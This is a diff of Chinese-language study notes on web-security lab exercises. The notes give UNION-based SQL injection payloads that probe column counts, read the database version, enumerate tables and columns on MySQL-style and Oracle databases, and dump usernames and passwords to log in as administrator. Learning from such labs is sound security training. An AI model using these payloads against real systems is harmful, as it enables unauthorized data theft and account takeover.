@@ -72,8 +72,59 @@ payload：`/filter?category=' union select null,banner from v$version--`
 
 #### 6. SQL injection attack, querying the database type and version on MySQL and Microsoft
 
-这道题不知道是啥问题，一直不行，官方的都不行。后面来做吧。
+这道题不知道是啥问题，一直不行，状态码一直是500。后面来做吧。
 
 我觉得payload大概率就是：`' union select null,@@version--`
 
-#### 7. 
+官方的payload：`'+UNION+SELECT+@@version,+NULL#`
+
+#### 7. SQL injection attack, listing the database contents on non-Oracle databases
+
+先用order by得到列数是2。
+
+`category='+order+by+2--`
+
+经过测试，发现两列都能用。
+
+`category='+union+select+'abc','def'--`
+
+查找表名：
+
+`category=%27+union+select+table_name,null+from+information_schema.tables--`
+
+查找列名：
+
+`category=%27+union+select+column_name,null+from+information_schema.columns+where+table_name='users_hgcvqp'--`
+
+查找信息：
+
+`category=%27+union+select+username_jjuqsb,password_pygkri+from+users_hgcvqp--`
+
+最后登录administrator。
+
+#### 8. SQL injection attack, listing the database contents on Oracle
+
+Oracle数据库的结构不一样。
+
+> cheat sheet里得到的信息：
+> SELECT * FROM all_tables
+> SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
+
+用order by测得列数为2。
+
+查找表名：
+
+`category=%27+union+select+table_name,null+from+all_tables--`
+
+查找列名：
+
+`category=%27+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_SDGZSD'--`
+
+查找信息：
+
+`category=%27+union+select+USERNAME_XLKHFA,PASSWORD_CUQKST+from+USERS_SDGZSD--`
+
+最后登录administrator。
+
+#### 9. Blind SQL injection with conditional responses
+
